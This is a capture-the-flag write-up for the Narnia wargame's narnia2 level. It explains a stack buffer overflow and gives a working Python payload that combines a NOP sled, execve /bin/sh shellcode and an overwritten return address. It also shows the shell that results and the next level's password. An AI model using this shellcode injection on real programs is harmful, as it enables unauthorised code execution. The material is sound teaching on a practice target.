__Narnia :: Level 1__
================


_Caleb Stewart_ | _Monday, January 18th, 2016_ 


> The goal of this level is to exploit a buffer overflow vulnerability in order to inject shellcode into the application.

> The password for the next level is stored in /etc/narnia_pass/narnia3, which is only readable by the narnia3 user.


----------

This time the levels executable requires an argument. Whatever you pass into the executable will be printed out similar to echo, but only one parameter is recognized. Also, watch out. No newline is printed, so it just makes your prompt look gross. 

For this level, we will need to accomplish a few things. First, we need to overflow our buffer in order to crash the program. This serves two purposes. Firstly, we can incrementally increase the size of the input in order to find the point where the application segfaults. This will also tell us where the return address is (if this doesn't mean anything to you, we'll discuss it later). So, we begin by crafting a fun little line with python.

```
narnia2@melinda:/tmp/tmp.jKVblrb2BS$ /narnia/narnia2 `python -c "print 'a'*10"`
aaaaaaaaaanarnia2@melinda:/tmp/tmp.jKVblrb2BS$ 
```

As you can see, 10 characters didn't break the program. We can continue increasing this number, and eventually we will find that 140 characters will cause a segfault. This means that later our payload will need to be at least 140 bytes long. We should now rerun the payload with something like 160 characters to ensure we overwrite our return address. This is so that we segfault due to our `ret` instruction and no because we currupted the stack. Now that we have a segfault, we can run `dmesg` to find out where the program failed. 

```
narnia2@melinda:/tmp/tmp.jKVblrb2BS$ dmesg | tail
narnia2[11491]: segfault at 0 ip 00000000ffffd672 sp 00000000ffffd630 error 6
narnia2[11712]: segfault at 0 ip 00000000ffffd672 sp 00000000ffffd630 error 6
narnia2[12111]: segfault at 0 ip 00000000ffffd6c2 sp 00000000ffffd630 error 6
narnia2[12161]: segfault at 0 ip 00000000ffffd6c2 sp 00000000ffffd630 error 6
traps: narnia2[12224] trap invalid opcode ip:ffffd6f2 sp:ffffd630 error:0
narnia2[12255]: segfault at 0 ip 00000000ffffd672 sp 00000000ffffd630 error 6
narnia2[12521]: segfault at 61616161 ip 0000000061616161 sp 00000000ffffd630 error 14
narnia2[12686]: segfault at 6e ip 00000000ffffd625 sp 00000000ffffd624 error 4
utumno4[13515]: segfault at ffffe000 ip 00000000f7f551ef sp 00000000fffed6b4 error 5 in libc-2.19.so[f7e24000+1a5000]
narnia2[18596]: segfault at 61616161 ip 0000000061616161 sp 00000000ffffd620 error 14
narnia2@melinda:/tmp/tmp.jKVblrb2BS$ 
```

The last line of `dmesg` shows that we segfaulted at the address `0x61616161` with a stack address of `0xffffd620`. This is very useful information. Firstly, we know that we overwrote the return address, because our instruction pointer is now a list of 'a's (0x61 is ascii for the 'a' character). Also, the stack pointer is important for implementing the exploit. Now that we have this information, we can begin building our payload. 

Our main goal for the payload is a shell. This means we need to find some binary shell code which is able to execute /bin/sh for us. If you'd like, you can use the same method as last time to compile the shell code yourself. For this tutorial, I will be using a shellcode exploit taken from shell-storm. Specifically, I'll be using the [`Linux/x86/execve_-bin-sh.c`](shellcode). There are a lot of different `/bin/sh` shell code implementations in shell-storms library. Any of them should work basically the same.

The next part of the payload is our "NOP slide". The nop slide is basically a large string of nop's which allow us to use an impercise instruction pointer. On x86, a `NOP` instruction will do nothing. It literally stands for "No OPeration". If you string a lot of `nop`'s together, and execute in the middle somewhere, you will simply "slide" down the list of `nop`'s until you hit normal code. If we put `nop`'s before our shell code, it makes choosing an execution address easier. We need to know how many nops to use as well. This can take some testing. In our case, we found that 140 bytes would cause a segfault. This means that the integer at 136 cannot be overwritten. We say that `nop`+shellcode should be 136, so we can find the length from that. This can be problematic. If you just get segfaults, try changing that. In my case, 136 was too large, even though it looked right. When it doubt, make it a little smaller. 120 seems to work great for me for this executable.

Lastly, we need to overwrite the return address of the `main` function to somewhere in our `nop` slide. This is where the stack pointer earlier came in. The buffer we are writing into is on the stack. The address we saw earlier was the top of the frame for the main function, therefore our code is located somewhere within the 160 bytes below that pointer. If we overwrote the return address with, say, `0xffffd620-64`, then we should be executin the middle of our buffer (hopefully our `nop` slide!).

We can put all this together in a python script to build our payload for us:

``` python
#!/usr/bin/env python
import struct

# Our execution address
address=0xffffd620 - 64
# The amount of space we need to cover
offset=120
# The shellcode itself
shellcode='\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
# How many nops we need to padd
nop_count=offset-len(shellcode)
# The actual nops themselves
nops='\x90'*(nop_count)
# build the payload
payload=nops+shellcode+struct.pack('<I', address)*8

# print the payload!
print payload
```

You can save this as payload.py and mark it executable. From here, we just need to execute `/narnia/narnia2` with the payload as the argument!

```
narnia2@melinda:/tmp/tmp.jKVblrb2BS$ /narnia/narnia2 `./exploit.py`
$ cat /etc/narnia_pass/narnia3
vaequeezee
$ 
```

Congratulations! You just completed narnia2!

[shellcode]: /shell-storm/Linux/x86/execve_-bin-sh.c